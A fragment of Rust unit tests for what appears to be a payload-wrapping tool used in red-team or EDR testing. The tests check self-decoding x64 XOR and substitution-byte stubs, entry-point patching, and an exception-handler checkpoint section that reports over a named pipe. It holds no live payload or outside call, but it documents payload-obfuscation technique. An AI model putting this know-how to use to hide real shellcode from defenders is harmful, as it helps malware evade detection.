    #[test]
    fn test_xor_layout_patch_offsets_within_bounds() {
        assert!(XOR_LAYOUT.payload_len_patch < XOR_STUB_CODE.len());
        assert!(XOR_LAYOUT.oep_patch.unwrap() < XOR_STUB_CODE.len());
        assert!(XOR_LAYOUT.oep_lea_offset.unwrap() < XOR_STUB_CODE.len());
    }

    #[test]
    fn test_subbyte_layout_patch_offsets_within_bounds() {
        assert!(SUBBYTE_LAYOUT.payload_len_patch < SUBBYTE_STUB_CODE.len());
        assert!(SUBBYTE_LAYOUT.oep_patch.unwrap() < SUBBYTE_STUB_CODE.len());
    }

    #[test]
    fn test_none_layout_no_payload_len_patch() {
        assert_eq!(NONE_LAYOUT.payload_len_patch, usize::MAX);
    }

    #[test]
    fn test_all_stubs_end_with_ret() {
        assert_eq!(XOR_STUB_CODE.last(), Some(&0xC3));
        assert_eq!(NONE_STUB_CODE.last(), Some(&0xC3));
        assert_eq!(SUBBYTE_STUB_CODE.last(), Some(&0xC3));
    }

    #[test]
    fn test_xor_stub_valid_x64() {
        use iced_x86::{Decoder, DecoderOptions};
        let mut decoder = Decoder::with_ip(64, XOR_STUB_CODE, 0x1000, DecoderOptions::NONE);
        let mut total_bytes = 0usize;
        while decoder.can_decode() {
            let instr = decoder.decode();
            assert!(
                !instr.is_invalid(),
                "Invalid x64 instruction at offset {:#x} in XOR stub",
                total_bytes
            );
            total_bytes += instr.len();
        }
        assert_eq!(
            total_bytes,
            XOR_STUB_CODE.len(),
            "Decoded bytes must match XOR stub size"
        );
    }

    #[test]
    fn test_none_stub_valid_x64() {
        use iced_x86::{Decoder, DecoderOptions};
        let mut decoder = Decoder::with_ip(64, NONE_STUB_CODE, 0x1000, DecoderOptions::NONE);
        let mut total_bytes = 0usize;
        while decoder.can_decode() {
            let instr = decoder.decode();
            assert!(
                !instr.is_invalid(),
                "Invalid x64 instruction at offset {:#x} in None stub",
                total_bytes
            );
            total_bytes += instr.len();
        }
        assert_eq!(total_bytes, NONE_STUB_CODE.len());
    }

    #[test]
    fn test_subbyte_stub_valid_x64() {
        use iced_x86::{Decoder, DecoderOptions};
        let mut decoder = Decoder::with_ip(64, SUBBYTE_STUB_CODE, 0x1000, DecoderOptions::NONE);
        let mut total_bytes = 0usize;
        while decoder.can_decode() {
            let instr = decoder.decode();
            assert!(
                !instr.is_invalid(),
                "Invalid x64 instruction at offset {:#x} in SubByte stub",
                total_bytes
            );
            total_bytes += instr.len();
        }
        assert_eq!(total_bytes, SUBBYTE_STUB_CODE.len());
    }

    #[test]
    fn test_subbyte_reverse_lut_roundtrip() {
        let forward: [u8; 16] = [0, 2, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 20];
        let reverse = build_subbyte_reverse_lut(&forward);

        // Every forward mapping should reverse correctly
        for (nibble, &encoded) in forward.iter().enumerate() {
            assert_eq!(
                reverse[encoded as usize], nibble as u8,
                "reverse[{}] should be {} but got {}",
                encoded, nibble, reverse[encoded as usize]
            );
        }
    }

    #[test]
    fn test_xor_stub_lea_displacement() {
        // LEA rsi, [rip+disp32] at offset 0x0B
        // disp32 is at bytes 0x0E..0x12
        let disp = u32::from_le_bytes(XOR_STUB_CODE[0x0E..0x12].try_into().unwrap());
        let rip_after_lea = 0x12u32;
        let expected_target = XOR_STUB_CODE.len() as u32; // key data at code_size
        assert_eq!(
            rip_after_lea + disp,
            expected_target,
            "XOR LEA displacement should point to key data at code_size"
        );
    }

    #[test]
    fn test_none_stub_lea_displacement() {
        // LEA rdi, [rip+disp32] at offset 0x0B
        let disp = u32::from_le_bytes(NONE_STUB_CODE[0x0E..0x12].try_into().unwrap());
        let rip_after_lea = 0x12u32;
        let expected_target = NONE_STUB_CODE.len() as u32;
        assert_eq!(
            rip_after_lea + disp,
            expected_target,
            "None LEA displacement should point to payload at code_size"
        );
    }

    #[test]
    fn test_subbyte_stub_lea_displacement() {
        // LEA rsi, [rip+disp32] at offset 0x0B
        let disp = u32::from_le_bytes(SUBBYTE_STUB_CODE[0x0E..0x12].try_into().unwrap());
        let rip_after_lea = 0x12u32;
        let expected_target = SUBBYTE_STUB_CODE.len() as u32;
        assert_eq!(
            rip_after_lea + disp,
            expected_target,
            "SubByte LEA displacement should point to reverse LUT at code_size"
        );
    }

    // =========================================================================
    // VEH Checkpoint Stub Tests
    // =========================================================================

    #[test]
    fn test_checkpoint_table_packing() {
        use crate::template::sc_checkpoints::BreakpointEntry;

        let entries = vec![
            BreakpointEntry {
                offset: 0x004A,
                original_byte: 0x48,
                name: "sc_checkpoint_0".to_string(),
                progress_pct: 25,
            },
            BreakpointEntry {
                offset: 0x0094,
                original_byte: 0x89,
                name: "sc_checkpoint_1".to_string(),
                progress_pct: 50,
            },
            BreakpointEntry {
                offset: 0x00DE,
                original_byte: 0xC3,
                name: "sc_checkpoint_2".to_string(),
                progress_pct: 75,
            },
        ];

        let packed = pack_checkpoint_table(&entries);

        // Each entry: 4 bytes offset + 1 byte orig = 5 bytes
        assert_eq!(packed.len(), 15, "3 entries × 5 bytes = 15");

        // Entry 0: offset=0x004A, orig=0x48
        assert_eq!(u32::from_le_bytes(packed[0..4].try_into().unwrap()), 0x004A);
        assert_eq!(packed[4], 0x48);

        // Entry 1: offset=0x0094, orig=0x89
        assert_eq!(u32::from_le_bytes(packed[5..9].try_into().unwrap()), 0x0094);
        assert_eq!(packed[9], 0x89);

        // Entry 2: offset=0x00DE, orig=0xC3
        assert_eq!(
            u32::from_le_bytes(packed[10..14].try_into().unwrap()),
            0x00DE
        );
        assert_eq!(packed[14], 0xC3);
    }

    #[test]
    fn test_instrumented_section_layout() {
        use crate::template::sc_checkpoints::BreakpointEntry;

        // Mock VEH stub: 24 bytes with sentinels at known positions
        let mut mock_veh = vec![0x90u8; 24];
        // Place 0xDEADBEEF at offset 4 (stub_entry data LEA disp)
        mock_veh[4..8].copy_from_slice(&0xDEADBEEFu32.to_le_bytes());
        // Place 0xCAFEBABE at offset 12 (JMP disp)
        mock_veh[12..16].copy_from_slice(&0xCAFEBABEu32.to_le_bytes());
        // Place 0xBAADF00D at offset 20 (veh_handler data LEA disp)
        mock_veh[20..24].copy_from_slice(&0xBAADF00Du32.to_le_bytes());

        let layout = VehStubLayout {
            code_size: 24,
            data_lea_disp_offset: 4,
            decode_jmp_disp_offset: 12,
            handler_data_lea_disp_offset: 20,
        };

        let entries = vec![BreakpointEntry {
            offset: 0x0010,
            original_byte: 0x55,
            name: "sc_checkpoint_0".to_string(),
            progress_pct: 50,
        }];

        let decode_stub = vec![0xCCu8; 8]; // mock decode stub
        let key_bytes = vec![0xAAu8, 0x55];
        let encoded = vec![0x90u8; 32];

        let section = assemble_instrumented_section(
            &mock_veh,
            &layout,
            &entries,
            &decode_stub,
            &key_bytes,
            &encoded,
        );

        // Verify total size
        let pipe_name_len = b"\\\\.\\pipe\\rededr_checkpoints\0".len();
        let data_trailer_size = 4 + 5 + pipe_name_len + 4 + 8; // count + 1 entry + pipe + base_rel + pipe_handle_slot
        let expected_total = 24 + data_trailer_size + 8 + 2 + 32;
        assert_eq!(section.len(), expected_total);

        // Verify VEH code starts the section (first byte should be 0x90)
        assert_eq!(section[0], 0x90);

        // Verify checkpoint count at data_start
        let data_start = 24;
        let count = u32::from_le_bytes(section[data_start..data_start + 4].try_into().unwrap());
        assert_eq!(count, 1);

        // Verify checkpoint entry
        let entry_offset =
            u32::from_le_bytes(section[data_start + 4..data_start + 8].try_into().unwrap());
        assert_eq!(entry_offset, 0x0010);
        assert_eq!(section[data_start + 8], 0x55); // orig_byte

        // Verify sentinel was patched (no longer 0xDEADBEEF)
        let patched_data_disp = u32::from_le_bytes(section[4..8].try_into().unwrap());
        assert_ne!(
            patched_data_disp, 0xDEADBEEF,
            "Data LEA sentinel should be patched"
        );

        let patched_jmp_disp = u32::from_le_bytes(section[12..16].try_into().unwrap());
        assert_ne!(
            patched_jmp_disp, 0xCAFEBABE,
            "JMP sentinel should be patched"
        );

        let patched_handler_disp = u32::from_le_bytes(section[20..24].try_into().unwrap());
        assert_ne!(
            patched_handler_disp, 0xBAADF00D,
            "Handler data LEA sentinel should be patched"
        );
    }

    #[test]
    fn test_assemble_patches_lea_displacement() {
        use crate::template::sc_checkpoints::BreakpointEntry;

        // Build a minimal mock where we can verify the RIP-relative math
        let mut mock_veh = vec![0x90u8; 28];
        // LEA disp at offset 8, JMP disp at offset 16, handler LEA at offset 24
        mock_veh[8..12].copy_from_slice(&0xDEADBEEFu32.to_le_bytes());
        mock_veh[16..20].copy_from_slice(&0xCAFEBABEu32.to_le_bytes());
        mock_veh[24..28].copy_from_slice(&0xBAADF00Du32.to_le_bytes());

        let layout = VehStubLayout {
            code_size: 28,
            data_lea_disp_offset: 8,
            decode_jmp_disp_offset: 16,
            handler_data_lea_disp_offset: 24,
        };

        let entries = vec![BreakpointEntry {
            offset: 0x20,
            original_byte: 0x48,
            name: "sc_checkpoint_0".to_string(),
            progress_pct: 50,
        }];

        let section = assemble_instrumented_section(
            &mock_veh,
            &layout,
            &entries,
            &[0xCC; 4],  // decode stub
            &[],         // no key
            &[0x90; 16], // payload
        );

        // Data LEA: disp32 at offset 8
        // RIP after = 8 + 4 = 12
        // Target = 28 (data_start = veh_code_size)
        // Expected disp = 28 - 12 = 16
        let data_disp = i32::from_le_bytes(section[8..12].try_into().unwrap());
        assert_eq!(
            data_disp, 16,
            "Data LEA should point to data_start (offset 28)"
        );

        // Handler data LEA: disp32 at offset 24
        // RIP after = 24 + 4 = 28
        // Target = 28 (same data_start)
        // Expected disp = 28 - 28 = 0
        let handler_disp = i32::from_le_bytes(section[24..28].try_into().unwrap());
        assert_eq!(
            handler_disp, 0,
            "Handler data LEA should point to data_start (offset 28)"
        );

        // Decode JMP: disp32 at offset 16
        // RIP after = 16 + 4 = 20
        // data_trailer: 4 + 5 + pipe_name_len + 4 + 8 (pipe_handle_slot)
        let pipe_name_len = b"\\\\.\\pipe\\rededr_checkpoints\0".len();
        let data_trailer = 4 + 5 + pipe_name_len + 4 + 8;
        let decode_stub_offset = 28 + data_trailer;
        // Expected disp = decode_stub_offset - 20
        let jmp_disp = i32::from_le_bytes(section[16..20].try_into().unwrap());
        assert_eq!(
            jmp_disp,
            decode_stub_offset as i32 - 20,
            "JMP should point to decode stub"
        );
    }

    #[test]
    fn test_veh_overhead_estimate() {
        let overhead = veh_overhead_estimate(512, 10);
        // 512 + 4 + 50 + pipe_name_len + 4 + 8
        let pipe_name_len = b"\\\\.\\pipe\\rededr_checkpoints\0".len();
        let expected = 512 + 4 + 50 + pipe_name_len + 4 + 8;
        assert_eq!(overhead, expected);
    }

    #[test]
    fn test_checkpoint_count_zero_is_noop() {
        let mut mock_veh = vec![0x90u8; 12];
        // Minimal sentinels
        mock_veh[0..4].copy_from_slice(&0xDEADBEEFu32.to_le_bytes());
        mock_veh[4..8].copy_from_slice(&0xCAFEBABEu32.to_le_bytes());
        mock_veh[8..12].copy_from_slice(&0xBAADF00Du32.to_le_bytes());

        let section = assemble_instrumented_section(
            &mock_veh,
            &VehStubLayout {
                code_size: 12,
                data_lea_disp_offset: 0,
                decode_jmp_disp_offset: 4,
                handler_data_lea_disp_offset: 8,
            },
            &[], // no checkpoints
            &[0xCC; 4],
            &[],
            &[0x90; 16],
        );

        // Count field should be 0
        let count = u32::from_le_bytes(section[12..16].try_into().unwrap());
        assert_eq!(count, 0, "Zero checkpoints should produce count=0");
    }

    /// Simulate the XOR stub's in-place decode on a mock section buffer.
    ///
    /// This exactly replicates the behavior of XOR_STUB_CODE:
    ///   - key[0] (al) XORs even-indexed bytes
    ///   - key[1] (dl) XORs odd-indexed bytes
    ///   - Uses `test bl, 1` to branch (same as the actual stub)
    #[test]
    fn test_xor_stub_inplace_decode_simulation() {
        let original_payload: Vec<u8> = (0..=255u8).collect(); // 256 bytes, all values
        let key = [0xAA_u8, 0x55_u8];

        // Encode (matches PayloadEncoder::encode_xor)
        let encoded: Vec<u8> = original_payload
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ key[i % 2])
            .collect();

        // Build section buffer: [stub | key | encoded_payload]
        let mut section = Vec::new();
        section.extend_from_slice(XOR_STUB_CODE);
        section.extend_from_slice(&key);
        section.extend_from_slice(&encoded);

        // Simulate: decode in-place, mimicking the XOR stub's exact logic
        let key_offset = XOR_STUB_CODE.len();
        let al = section[key_offset]; // key[0]
        let dl = section[key_offset + 1]; // key[1]
        let payload_start = key_offset + 2;
        let payload_len = encoded.len();

        let mut ebx: u32 = 0;
        while (ebx as usize) < payload_len {
            // test bl, 1; jz .even → odd indices use dl, even use al
            if (ebx as u8) & 1 != 0 {
                section[payload_start + ebx as usize] ^= dl;
            } else {
                section[payload_start + ebx as usize] ^= al;
            }
            ebx += 1;
        }

        // Verify decoded payload matches original
        let decoded = &section[payload_start..payload_start + payload_len];
        assert_eq!(
            decoded,
            &original_payload[..],
            "In-place XOR decode must perfectly recover original payload"
        );
    }

    /// Simulate SubByte stub's in-place decode on a mock section buffer.
    #[test]
    fn test_subbyte_stub_inplace_decode_simulation() {
        let original_payload = vec![0x41_u8, 0x42, 0xAB, 0xCD, 0xFF, 0x00, 0x0F, 0xF0];
        let forward: [u8; 16] = [0, 2, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 20];

        // Encode
        let mut encoded = Vec::with_capacity(original_payload.len() * 2);
        for &byte in &original_payload {
            encoded.push(forward[(byte >> 4) as usize]);
            encoded.push(forward[(byte & 0x0F) as usize]);
        }

        // Build reverse LUT
        let reverse_lut = build_subbyte_reverse_lut(&forward);

        // Build section: [stub | lut(256) | encoded(2N)]
        let mut section = Vec::new();
        section.extend_from_slice(SUBBYTE_STUB_CODE);
        section.extend_from_slice(&reverse_lut);
        section.extend_from_slice(&encoded);

        // Simulate in-place decode
        let lut_offset = SUBBYTE_STUB_CODE.len();
        let payload_offset = lut_offset + 256;
        let payload_len = original_payload.len(); // original length

        for i in 0..payload_len {
            let hi_enc = section[payload_offset + i * 2] as usize;
            let lo_enc = section[payload_offset + i * 2 + 1] as usize;
            let hi_nibble = section[lut_offset + hi_enc];
            let lo_nibble = section[lut_offset + lo_enc];
            section[payload_offset + i] = (hi_nibble << 4) | lo_nibble;
        }

        let decoded = &section[payload_offset..payload_offset + payload_len];
        assert_eq!(
            decoded,
            &original_payload[..],
            "In-place SubByte decode must perfectly recover original payload"
        );
    }
}
